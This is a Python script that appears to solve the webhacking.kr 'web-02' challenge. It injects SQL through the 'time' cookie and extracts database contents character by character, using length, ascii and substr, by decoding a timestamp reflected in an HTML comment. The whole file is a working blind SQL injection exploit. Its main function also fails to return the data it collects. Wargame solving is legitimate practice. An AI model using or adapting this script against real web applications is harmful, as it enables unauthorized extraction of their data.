import sys
from urllib import request, parse

import time, datetime

def to_timestamp(string) -> int:
    second = int(time.mktime(datetime.datetime.strptime(string, "%Y-%m-%d %H:%M:%S").timetuple())) 
    second -= 3155760000
    return second

def get_ascii(param) -> int:
    url = 'https://webhacking.kr/challenge/web-02/'
    req = request.Request(url)
    cookie = "PHPSESSID=1234; time=" + (param)
    req.add_header('cookie', cookie)
    res = request.urlopen(req)
    res = res.read().decode('utf-8')
    return to_timestamp(res[res.find("<!--") + 5 : res.find("-->")-1])


    

def get_length(query)->int:
    query = query.split()
    query[1] = f"length({query[1]})"
    return get_ascii(' '.join(query))

def get_content(query):
    if not query.split()[-1].endswith("()") and "where" in query.split() and not "limit" in query.split():
        arg1 = f'"{query.split()[-1]}"'
        arg2 = query.split()
        arg2[-1] = arg1
        query = " ".join(arg2)
    query = '(' + query +')'
    content_len = get_length(query)
    if content_len == 0:
        print('Invalid input')
        return ''
    content = ''
    query = query.split()
    selected = query[1]
    for idx in range(1, content_len + 2):
        query[1] = f"ascii(substr({selected}, {idx}, 1))"
        content += chr(get_ascii(' '.join(query)))
        under_bar = "_" * (content_len - len(content))

        sys.stdout.write(f'\r[{str(content_len)}] {content}{ under_bar }')
    
    

if len(sys.argv) < 2:
    print("인자값이 없습니다.")
    exit()

contents = get_content(' '.join(sys.argv[1:]))